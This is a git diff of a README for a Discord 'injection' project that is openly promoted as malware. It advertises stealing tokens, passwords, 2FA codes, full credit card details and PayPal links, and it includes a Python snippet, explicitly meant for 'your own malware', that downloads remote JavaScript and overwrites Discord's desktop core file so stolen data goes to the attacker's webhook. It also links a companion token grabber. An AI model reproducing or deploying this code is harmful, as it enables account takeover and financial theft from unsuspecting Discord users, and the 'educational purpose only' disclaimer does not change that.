@@ -24,12 +24,17 @@
   <img src="https://img.shields.io/github/forks/Rdimo/Discord-Injection?color=7F9DE0&label=Forks&style=flat-square" </a>
 </p>
 
-##### ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ [🌌・Discord](https://cheataway.com) ⋮  [💉・Setting up the injection](https://github.com/Rdimo/Discord-Injection#configure-discord-injection) ⋮ [💻・License](https://github.com/Rdimo/Discord-Injection#license) ⋮ [📜・ChangeLog](https://github.com/Rdimo/Discord-Injection#changelog)
+<h4 align="center">
+  <a href="https://cheataway.com">🌌・Discord</a>
+  <a href="https://github.com/Rdimo/Discord-Injection#configure-discord-injection">💉・Setting up the injection</a>
+  <a href="https://github.com/Rdimo/Discord-Injection#license">💻・License</a>
+  <a href="https://github.com/Rdimo/Discord-Injection#changelog">📜・ChangeLog</a>
+</h4>
 
 <h2 align="center">
   Discord-Injection was made by
 
-  Love ❌ code ✅
+Love ❌ code ✅
 </h2>
 
 ---
@@ -42,18 +47,19 @@
 ✔ Works on both Windows and Darwin! \
 ✔ Auto buy nitro! (toggleable) \
 ✔ Pings on info stolen! (toggleable) \
-✔ Discord 2FA Codes for accounts with 2FA enabled.  \
+✔ Discord 2FA Codes for accounts with 2FA enabled. \
 ✔ Disables login thru QR code! \
 ✔ Grabs Token, Nitro status, Billing Status + more! \
 ✔ Grabs Email & Password for their account. (updates if they change it) \
 ✔ Grabs whole credit card (if they enter one while injection is in) \
 ✔ Notifies when paypal account has been added!
 
---- 
+---
 
 ## 🚀・Configure Discord Injection!
 
 You'll need [Git](https://git-scm.com) to start off!
+
 ```sh-session
 git@2.17.1 or higher
 ```
@@ -65,6 +71,7 @@ git@2.17.1 or higher
 $ git clone https://github.com/rdimo/Discord-injection.git
 
 ```
+
 Copy the raw url of the [injection](./injection.js) and then paste it in your code
 
 [forking](https://github.com/Rdimo/Discord-injection/fork) this repo is also a viable way but make sure to go into the code and change the config to your preferences! ⇣⇣⇣
@@ -83,10 +90,13 @@ const config = {
     ... //rest of the config you should NOT touch
 };
 ```
+
 > Don't quite understand how to set it up? [Click me!](https://github.com/Rdimo/Discord-Injection#want-to-use-it-but-dont-know-shit-about-coding)
 
 ## 🎈・Code example
+
 Example of how you can implement this injection into your own malware
+
 ```py
 import os
 import re
@@ -98,7 +108,7 @@ def inject():
         if 'discord' in _dir.lower():
             for __dir in os.listdir(os.path.abspath(os.getenv('localappdata')+os.sep+_dir)):
                 if re.match(r'app-(\d*\.\d*)*', __dir):
-                    abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir) 
+                    abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir)
                     f = requests.get("https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", webhook)
                     with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                         indexFile.write(f)
@@ -109,6 +119,7 @@ if __name__ == "__main__":
 ```
 
 ## 👴・Want to use it but don't know shit about coding?
+
 No worries, [Hazard-Token-Grabber-V2](https://github.com/Rdimo/Hazard-Token-Grabber-V2) is a stealer that uses this injection + steals more!
 
 ## 🤝・Contributing
@@ -118,28 +129,34 @@ Any ideas on how to improve the injection? Or just think you got something you w
 Found a bug? please please please [Open a new issue](https://github.com/rdimo/Discord-injection/issues) and tell me about it so I can fix it asap
 
 ## 🎉・Upcoming/Todo
+
 - Grab ip, name etc...
 - Fix bugs
 - More settings
 
 ## :seedling:・Inspiration/Credits
+
 Discord-Injection is heavily inspired by [stanleys](https://github.com/Stanley-GF) injection but has been upgraded quite alot since \
 A few snippets are from his injection so huge cred to stan
 
 - [his injection](https://github.com/Stanley-GF/Arizona/blob/main/src/injection/injection-clean.js)
 
-## 📄・License 
+## 📄・License
 
 This project is licensed under the GNU General Public License v3.0 License - see the [LICENSE.md](./LICENSE) file for details
 
-・Educational purpose only and all your consequences caused by you actions is your responsibility 
+・Educational purpose only and all your consequences caused by you actions is your responsibility
 
 ・Selling this **Free** injection is forbidden
 
 ・If you make a copy of this/or fork it, it **must** be open-source and have credits linking to this repo
 
 ## 💭・ChangeLog
+
 ```diff
+v0.0.6 ⋮ 2022-04-13
++ Discriminator doesn't get mixed up with the ID
+
 v0.0.5 ⋮ 2022-04-08
 + Formatting
 + bug fixes
